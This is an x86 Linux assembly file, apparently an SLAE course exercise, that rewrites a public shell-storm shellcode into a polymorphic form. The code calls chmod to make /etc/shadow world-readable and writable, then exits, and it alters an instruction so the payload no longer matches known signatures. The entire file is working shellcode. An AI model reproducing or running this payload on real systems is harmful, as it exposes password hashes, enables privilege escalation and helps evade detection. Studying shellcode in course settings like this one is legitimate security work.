;SLAE-513
;http://shell-storm.org/shellcode/files/shellcode-71.php
;Linux/x86 - chmod() 666 /etc/shadow & exit()

;39 bytes shellcode
global _start
section .text
_start:

    push ecx
    mov cx, 0x1b6; = 438
    ;push 0x776f6461; woda [ORIGINAL]
    mov esi, 0x776f6158;   [NEW]
    add si, 0x309 ;  woda  [NEW]
    mov dword [esp-4], esi;[NEW]
    push 0x68732f63; hs/c
    push 0x74652f2f; te//
    mov ebx, esp ;save pointer
    push 0xf     ;chmod
    pop eax      ;15
    int 0x80
    inc eax ;exit
    int 0x80